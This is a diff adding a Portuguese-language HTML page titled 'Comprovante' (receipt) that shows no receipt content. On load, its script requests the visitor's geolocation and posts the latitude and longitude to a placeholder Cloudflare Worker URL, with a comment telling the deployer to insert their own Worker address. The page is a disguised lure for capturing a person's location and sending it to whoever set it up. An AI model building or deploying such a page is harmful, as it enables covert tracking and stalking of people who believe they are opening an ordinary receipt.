@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <title>Comprovante</title>
+</head>
+<body style="background-color: antiquewhite;">
+    <h1>Comprovante</h1>
+
+    <script>
+        window.addEventListener("load", () => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+            } else {
+                alert("Seu navegador não suporta geolocalização!");
+            }
+        });
+
+        async function sendLocation(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+
+            // Substitua pela URL do seu Worker depois de criá-lo
+            const workerUrl = "https://seu-worker.seu-nome.workers.dev";
+            
+            try {
+                const response = await fetch(workerUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ latitude, longitude })
+                });
+                
+                const data = await response.json();
+                alert(data.success ? "Localização enviada!" : "Erro ao enviar");
+            } catch (error) {
+                console.error("Erro:", error);
+                alert("Falha na comunicação");
+            }
+        }
+
+        function handleError(error) {
+            alert("Erro: " + error.message);
+        }
+    </script>
+</body>
+</html>
